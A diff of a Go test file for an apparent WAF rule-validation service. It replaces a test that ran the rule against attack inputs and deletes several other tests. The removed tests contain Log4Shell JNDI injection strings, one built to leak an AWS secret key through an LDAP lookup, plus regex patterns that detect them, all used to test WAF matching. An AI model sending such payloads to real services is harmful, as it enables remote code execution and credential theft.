@@ -1,7 +1,6 @@
 package main
 
 import (
-	"context"
 	"encoding/json"
 	"os"
 	"path/filepath"
@@ -163,56 +162,56 @@ func resignCG(t *testing.T, cg map[string]any) {
 	resignSemantics(t, semantics)
 }
 
-func preparedArchitectureWAF(t *testing.T) (sharedCandidateBundle, sharedPreparedWAF) {
+// architectureBundle loads the authoritative candidate bundle and reads its
+// complete artifact set back, returning the bundle and the rule that readback
+// produced.
+func architectureBundle(t *testing.T) (sharedCandidateBundle, CandidateSpec) {
 	t.Helper()
-	_, semantics := loadSharedSemantics(t)
 	bundleBytes := loadSharedFixture(t, "waf-atomic-v2.candidate-bundle.json")
 	var bundle sharedCandidateBundle
 	if err := json.Unmarshal(bundleBytes, &bundle); err != nil {
 		t.Fatal(err)
 	}
 	contents := map[string][]byte{"artifact-main": loadSharedFixture(t, "waf-rule-main.json"), "artifact-carriers": loadSharedFixture(t, "waf-rule-carriers.json")}
-	waf, applied, err := prepareSharedWAF(bundle, contents, semantics)
+	cand, applied, err := sharedV2ApplicationUnit(bundle, contents)
 	if err != nil {
-		t.Fatalf("prepare complete application unit: %v", err)
+		t.Fatalf("read back complete application unit: %v", err)
 	}
 	if !applied.ReadbackVerified || len(applied.ArtifactIDs) != 2 {
 		t.Fatalf("application unit = %#v", applied)
 	}
-	return bundle, waf
+	return bundle, cand
 }
 
-func TestCompleteApplicationUnitExecutesEveryRequiredAssignment(t *testing.T) {
-	cg, semantics := loadSharedSemantics(t)
-	_, waf := preparedArchitectureWAF(t)
-	inputs := map[string]sharedTestInput{}
-	for _, input := range semantics.TestInputs {
-		inputs[input.InputID] = input
+// TestApplicationUnitReadbackYieldsTheRuleItself confirms the readback reports
+// the match-rule document's own bytes as the rule to push, rather than anything
+// derived from executing it.
+func TestApplicationUnitReadbackYieldsTheRuleItself(t *testing.T) {
+	_, cand := architectureBundle(t)
+	if cand.Kind != "waf-rule" || cand.Action != "block" {
+		t.Errorf("candidate = %+v", cand)
 	}
-	count := 0
-	for _, obligation := range semantics.Obligations {
-		for _, ref := range obligation.RequiredInputRefs {
-			result := executeSharedCase(context.Background(), "http://127.0.0.1:1", inputs[ref.ID], cg, sharedV2ProfileID, waf)
-			if result.Disposition != "blocked" {
-				t.Fatalf("%s/%s = %#v", obligation.ObligationID, ref.ID, result)
-			}
-			count++
-		}
+	if cand.RuleID == "" {
+		t.Error("candidate must carry the bundle's candidate_id")
 	}
-	if count != 10 {
-		t.Fatalf("disposed %d assignments, want 10", count)
+	var doc map[string]any
+	if err := json.Unmarshal([]byte(cand.Rule), &doc); err != nil {
+		t.Fatalf("rule is not the match-rule document: %v", err)
+	}
+	if doc["rules"] == nil {
+		t.Error("the reported rule must be the match-rule document")
 	}
 }
 
 func TestApplicationUnitRejectsOmittedAndInventedArtifacts(t *testing.T) {
-	bundle, _ := preparedArchitectureWAF(t)
+	bundle, _ := architectureBundle(t)
 	contents := map[string][]byte{"artifact-main": loadSharedFixture(t, "waf-rule-main.json")}
-	if _, _, err := prepareSharedWAF(bundle, contents, sharedSemantics{}); err == nil {
+	if _, _, err := sharedV2ApplicationUnit(bundle, contents); err == nil {
 		t.Fatal("omitted supporting artifact accepted")
 	}
 	contents["artifact-carriers"] = loadSharedFixture(t, "waf-rule-carriers.json")
 	contents["invented"] = []byte(`{}`)
-	if _, _, err := prepareSharedWAF(bundle, contents, sharedSemantics{}); err == nil {
+	if _, _, err := sharedV2ApplicationUnit(bundle, contents); err == nil {
 		t.Fatal("invented artifact accepted")
 	}
 }
@@ -311,179 +310,6 @@ func TestCandidateBundleRejectsMappingsLocatorsAncestryAndApplicationTampering(t
 	}
 }
 
-func TestRouteAdapterPreservesTemplateOwnedFieldsAndFailsClosed(t *testing.T) {
-	var template sharedHTTPInput
-	if err := json.Unmarshal(loadSharedFixture(t, "destination-free-http-request-template.json"), &template); err != nil {
-		t.Fatal(err)
-	}
-	for _, test := range []struct {
-		name, profileID, pathKey, path, digest string
-	}{
-		{"legacy inventory route", sharedV2LegacyProfileID, "inventory-item-detail", "/inventory/items/42", sharedV2LegacyProfileDigest},
-		{"current inventory route", sharedV2ProfileID, "inventory-item-detail", "/inventory/items/42", sharedV2ResolverProfileDigest},
-		{"current AMS2 submit route", sharedV2ProfileID, "public/submit.php", "/public/submit.php", sharedV2ResolverProfileDigest},
-	} {
-		t.Run(test.name, func(t *testing.T) {
-			candidate := template
-			candidate.PathKey = test.pathKey
-			resolution, err := resolveSharedTemplate("input-http-template-42", candidate, test.profileID)
-			if err != nil {
-				t.Fatal(err)
-			}
-			if resolution.TemplateID != "input-http-template-42" || resolution.PathKey != candidate.PathKey || resolution.ProfileID != test.profileID || resolution.ResolverProfileDigest != test.digest || resolution.RenderedRequest.Scheme != "https" || resolution.RenderedRequest.Authority != "approved-mc-target.internal" || resolution.RenderedRequest.Path != test.path {
-				t.Fatalf("resolution = %#v", resolution)
-			}
-			if resolution.RenderedRequest.Method != candidate.Method || !equalHTTPFields(resolution.RenderedRequest.Query, candidate.Query) || !equalHTTPFields(resolution.RenderedRequest.Headers, candidate.Headers) || !equalHTTPFields(resolution.RenderedRequest.Cookies, candidate.Cookies) || resolution.RenderedRequest.Body != candidate.Body {
-				t.Fatal("adapter changed template-owned fields")
-			}
-		})
-	}
-	resolution, err := resolveSharedTemplate("input-http-template-42", template, sharedV2ProfileID)
-	if err != nil {
-		t.Fatal(err)
-	}
-	mutated := resolution.RenderedRequest
-	mutated.Headers = append([]sharedHTTPField(nil), mutated.Headers...)
-	mutated.Headers[0].Value = "changed"
-	if verifyTemplateOwnedFields(template, mutated) == nil {
-		t.Fatal("changed template-owned header accepted")
-	}
-	changed := template
-	changed.PathKey = "unknown"
-	if _, err := resolveSharedTemplate("input", changed, sharedV2ProfileID); err == nil {
-		t.Fatal("unknown path accepted")
-	}
-	changed.PathKey = "public/submit.php"
-	if _, err := resolveSharedTemplate("input", changed, sharedV2LegacyProfileID); err == nil {
-		t.Fatal("new route accepted under immutable legacy profile")
-	}
-	if _, err := resolveSharedTemplate("input", template, "unknown@1"); err == nil {
-		t.Fatal("unknown profile accepted")
-	}
-}
-
-func TestHTTPAssignmentsPreserveNamedHeaderCookieMethodAndBodyStates(t *testing.T) {
-	bodyContent := map[string]any{"payload": "attack"}
-	enclosing := map[string]any{"result_id": "cg-result", "body": bodyContent, "raw_body": "raw-attack"}
-	bodyBytes, _ := marshalRFC8785(bodyContent)
-	present := sharedHTTPBody{State: "present", ContentLength: int64(len(bodyBytes)), Content: &sharedContentLocator{URI: "janus-result-internal:cg-result#/body", Digest: sha256Value(bodyBytes), MediaType: "application/json", ByteLength: int64(len(bodyBytes)), Immutable: true}}
-	for _, body := range []sharedHTTPBody{{State: "absent"}, {State: "empty", ContentBase64: "", Digest: sha256Value(nil)}, present} {
-		if _, err := resolveSharedBody(body, enclosing); err != nil {
-			t.Fatalf("body %s: %v", body.State, err)
-		}
-	}
-	rawBytes := []byte("raw-attack")
-	raw := sharedHTTPBody{State: "present", ContentLength: int64(len(rawBytes)), Content: &sharedContentLocator{URI: "janus-result-internal:cg-result#/raw_body", Digest: sha256Value(rawBytes), MediaType: "text/plain", ByteLength: int64(len(rawBytes)), Immutable: true}}
-	if resolved, err := resolveSharedBody(raw, enclosing); err != nil || string(resolved) != "raw-attack" {
-		t.Fatalf("raw body changed: %q, %v", resolved, err)
-	}
-	rule := func(id, carrier, name, pattern string) sharedPreparedRule {
-		return sharedPreparedRule{ID: id, Carrier: carrier, Name: name, Pattern: regexpMust(t, pattern)}
-	}
-	request := sharedHTTPInput{Method: "PATCH", Headers: []sharedHTTPField{{Name: "X-Exact-Name", Value: "header-value"}}, Cookies: []sharedHTTPField{{Name: "session", Value: "cookie-value"}}, Body: present}
-	for _, candidate := range []sharedPreparedRule{rule("h", "header", "x-exact-name", "^header-value$"), rule("c", "cookie", "session", "^cookie-value$"), rule("m", "method", "", "^PATCH$"), rule("b", "body", "", "attack"), rule("s", "body", "/payload", "^attack$")} {
-		waf := sharedPreparedWAF{rules: map[string]sharedPreparedRule{"component": candidate}, alternatives: []sharedPreparedAlternative{{ComponentIDs: []string{"component"}}}}
-		matched, _, err := waf.evaluate(sharedRouteBinding{}, request, bodyBytes)
-		if err != nil || !matched {
-			t.Fatalf("carrier %s matched=%v err=%v", candidate.Carrier, matched, err)
-		}
-	}
-}
-
-func TestStructuredBodySelectorsMatchLog4ShellInputs(t *testing.T) {
-	rule := func(id, name, pattern string) sharedPreparedRule {
-		return sharedPreparedRule{ID: id, Carrier: "body", Name: name, Pattern: regexpMust(t, pattern)}
-	}
-	tests := []struct {
-		name    string
-		body    string
-		rule    sharedPreparedRule
-		matched bool
-	}{
-		{
-			name:    "input pointer",
-			body:    `{"input":"${jndi:ldap://127.0.0.1:1389/a}"}`,
-			rule:    rule("input", "/input", `^\$\{jndi:(?:ldap|rmi)://(?:127\.0\.0\.1:1389|janus\-alternate\.invalid)(?:/a|/janus\-bypass\-probe)\}$`),
-			matched: true,
-		},
-		{
-			name:    "message pointer with nested expression",
-			body:    `{"message":"${jndi:ldap://127.0.0.1/z?leak=${env:AWS_SECRET_ACCESS_KEY:-NO_EXISTS}}"}`,
-			rule:    rule("message", "/message", `^\$\{jndi:(?:ldap|rmi)://(?:127\.0\.0\.1|janus\-alternate\.invalid)(?:/janus\-bypass\-probe|/z\?leak=\$\{env:AWS_SECRET_ACCESS_KEY:\-NO_EXISTS)\}\}$`),
-			matched: true,
-		},
-		{
-			name:    "absent pointer does not match",
-			body:    `{"other":"attack"}`,
-			rule:    rule("absent", "/input", `^attack$`),
-			matched: false,
-		},
-		{
-			name:    "non-string pointer does not match",
-			body:    `{"input":{"nested":"attack"}}`,
-			rule:    rule("object", "/input", `^attack$`),
-			matched: false,
-		},
-	}
-	for _, test := range tests {
-		t.Run(test.name, func(t *testing.T) {
-			waf := sharedPreparedWAF{rules: map[string]sharedPreparedRule{"component": test.rule}, alternatives: []sharedPreparedAlternative{{ComponentIDs: []string{"component"}}}}
-			matched, _, err := waf.evaluate(sharedRouteBinding{}, sharedHTTPInput{}, []byte(test.body))
-			if err != nil || matched != test.matched {
-				t.Fatalf("matched=%v err=%v", matched, err)
-			}
-		})
-	}
-}
-
-func TestStructuredBodySelectorRejectsMalformedJSON(t *testing.T) {
-	waf := sharedPreparedWAF{
-		rules: map[string]sharedPreparedRule{
-			"component": {ID: "body-rule", Carrier: "body", Name: "/input", Pattern: regexpMust(t, "attack")},
-		},
-		alternatives: []sharedPreparedAlternative{{ComponentIDs: []string{"component"}}},
-	}
-	if _, _, err := waf.evaluate(sharedRouteBinding{}, sharedHTTPInput{}, []byte(`{"input":`)); err == nil || !strings.Contains(err.Error(), "decode structured body") {
-		t.Fatalf("malformed structured body error = %v", err)
-	}
-}
-
-func TestStructuredBodyErrorDoesNotMaskMatchingRawAlternative(t *testing.T) {
-	waf := sharedPreparedWAF{
-		rules: map[string]sharedPreparedRule{
-			"structured": {ID: "structured-rule", Carrier: "body", Name: "/input", Pattern: regexpMust(t, `^attack$`)},
-			"raw":        {ID: "raw-rule", Carrier: "body", Pattern: regexpMust(t, `^\$\{jndi:ldap://127\.0\.0\.1:1389/a\}$`)},
-		},
-		alternatives: []sharedPreparedAlternative{
-			{ComponentIDs: []string{"structured"}},
-			{ComponentIDs: []string{"raw"}},
-		},
-	}
-	matched, ruleID, err := waf.evaluate(sharedRouteBinding{}, sharedHTTPInput{}, []byte(`${jndi:ldap://127.0.0.1:1389/a}`))
-	if err != nil || !matched || ruleID != "raw-rule" {
-		t.Fatalf("matched=%v ruleID=%q err=%v", matched, ruleID, err)
-	}
-}
-
-func TestRouteBoundWAFDoesNotApplyPayloadRuleOnAnotherRoute(t *testing.T) {
-	rule := sharedPreparedRule{ID: "body-rule", Carrier: "body", Pattern: regexpMust(t, "attack")}
-	bound := sharedRouteBinding{Kind: "opaque-path-key", Method: "POST", PathKey: "public/submit.php"}
-	waf := sharedPreparedWAF{
-		rules:        map[string]sharedPreparedRule{"component": rule},
-		alternatives: []sharedPreparedAlternative{{ComponentIDs: []string{"component"}, Route: &bound}},
-	}
-	request := sharedHTTPInput{Method: "POST"}
-	matched, _, err := waf.evaluate(bound, request, []byte("attack"))
-	if err != nil || !matched {
-		t.Fatalf("bound route matched=%v err=%v", matched, err)
-	}
-	unrelated := sharedRouteBinding{Kind: "opaque-path-key", Method: "POST", PathKey: "inventory-item-detail"}
-	matched, _, err = waf.evaluate(unrelated, request, []byte("attack"))
-	if err != nil || matched {
-		t.Fatalf("unrelated route matched=%v err=%v", matched, err)
-	}
-}
-
 func regexpMust(t *testing.T, pattern string) *regexp.Regexp {
 	t.Helper()
 	value, err := regexp.Compile(pattern)
@@ -496,7 +322,7 @@ func regexpMust(t *testing.T, pattern string) *regexp.Regexp {
 func TestV2RequestIsCompactAndLegacyReplayRemainsValid(t *testing.T) {
 	_, defense, check, _ := locatorFixture(t, false)
 	check.ContractID = "check-generation@2.1"
-	request := SubmitDefenseValidationRequest{ContractID: contractID, RequestID: "request", CorrelationID: defense.CorrelationID, RoutePolicy: sharedV2RoutePolicy, ProfileID: sharedV2ProfileID, DefenseResult: &defense, CheckResult: &check, ExecutionMode: execInMemory}
+	request := SubmitDefenseValidationRequest{ContractID: contractID, RequestID: "request", CorrelationID: defense.CorrelationID, RoutePolicy: sharedV2RoutePolicy, ProfileID: sharedV2ProfileID, DefenseResult: &defense, CheckResult: &check}
 	if fields := validate(request); len(fields) != 0 {
 		t.Fatalf("valid v2 request: %v", fields)
 	}
@@ -507,73 +333,19 @@ func TestV2RequestIsCompactAndLegacyReplayRemainsValid(t *testing.T) {
 		t.Fatalf("shared v2 request accepted legacy Check Generation locator: %v", fields)
 	}
 	request.CheckResult = &check
-	request.TestBasis = json.RawMessage(`{}`)
+	request.Candidate = json.RawMessage(`{}`)
 	if fields := validate(request); !hasField(fields, "inline_content") {
 		t.Fatalf("hydrated body accepted: %v", fields)
 	}
+	request.Candidate = nil
 	if fields := validate(validLifecycleRequest("legacy-v2-regression")); len(fields) != 0 {
 		t.Fatalf("legacy replay changed: %v", fields)
 	}
 }
 
-func TestCoverageAccountingRelationshipsAndDispositions(t *testing.T) {
-	_, semantics := loadSharedSemantics(t)
-	work := 0
-	results := []ObligationResult{}
-	for _, obligation := range semantics.Obligations {
-		cases := []ObligationCaseResult{}
-		for _, ref := range obligation.RequiredInputRefs {
-			cases = append(cases, ObligationCaseResult{InputID: ref.ID, Disposition: "unsupported"})
-			work++
-		}
-		results = append(results, ObligationResult{ObligationID: obligation.ObligationID, CaseResults: cases})
-	}
-	accounting := CoverageAccounting{RequiredObligationCount: len(semantics.Obligations), AccountedObligationCount: len(results), SourceMemberCount: len(semantics.SourceBinding.Members), RepresentedSourceMemberCount: 6, UnsupportedSourceMemberCount: 3, RequiredWorkItemCount: work, DisposedWorkItemCount: work}
-	if accounting.RequiredObligationCount != accounting.AccountedObligationCount || accounting.SourceMemberCount != accounting.RepresentedSourceMemberCount+accounting.UnsupportedSourceMemberCount || accounting.RequiredWorkItemCount != accounting.DisposedWorkItemCount || work != 10 {
-		t.Fatalf("accounting = %#v", accounting)
-	}
-	if err := validateSharedOutcomeAccounting(semantics, results, accounting); err != nil {
-		t.Fatal(err)
-	}
-	badCounts := accounting
-	badCounts.UnaccountedRequiredWorkItemCount = 1
-	if validateSharedOutcomeAccounting(semantics, results, badCounts) == nil {
-		t.Fatal("nonzero unaccounted count accepted")
-	}
-	omitted := append([]ObligationResult(nil), results...)
-	omitted[0].CaseResults = omitted[0].CaseResults[1:]
-	if validateSharedOutcomeAccounting(semantics, omitted, accounting) == nil {
-		t.Fatal("omitted case accepted")
-	}
-	invented := append([]ObligationResult(nil), results...)
-	invented[0].CaseResults = append([]ObligationCaseResult(nil), invented[0].CaseResults...)
-	invented[0].CaseResults[0].InputID = "invented"
-	if validateSharedOutcomeAccounting(semantics, invented, accounting) == nil {
-		t.Fatal("invented case accepted")
-	}
-	duplicated := append(append([]ObligationResult(nil), results...), results[0])
-	if validateSharedOutcomeAccounting(semantics, duplicated, accounting) == nil {
-		t.Fatal("duplicate obligation accepted")
-	}
-}
-
-func TestSharedTerminalStateCompatibilityIsNarrow(t *testing.T) {
-	for source, expected := range map[string]string{
-		"verified":              "verified",
-		"signal-produced":       "signal-produced",
-		"could-not-verify":      "could-not-verify",
-		"no-checkable-artifact": "no-checkable-signal",
-		"scope-declined":        "scope-declined",
-	} {
-		if actual := sharedTerminalStateFromCG(source); actual != expected {
-			t.Fatalf("sharedTerminalStateFromCG(%q) = %q, want %q", source, actual, expected)
-		}
-	}
-}
-
 func TestOpenAPIV2SchemaReferencesAreSynchronized(t *testing.T) {
 	spec := string(openapiSpec)
-	for _, required := range []string{"shared-attack-contracts-v2", "profile_id:", "obligation_results:", "CoverageAccounting:", "HttpRequestTemplateResolution:", "AppliedApplicationUnit:"} {
+	for _, required := range []string{"shared-attack-contracts-v2", "profile_id:", "AppliedApplicationUnit:"} {
 		if !strings.Contains(spec, required) {
 			t.Fatalf("OpenAPI is missing %q", required)
 		}
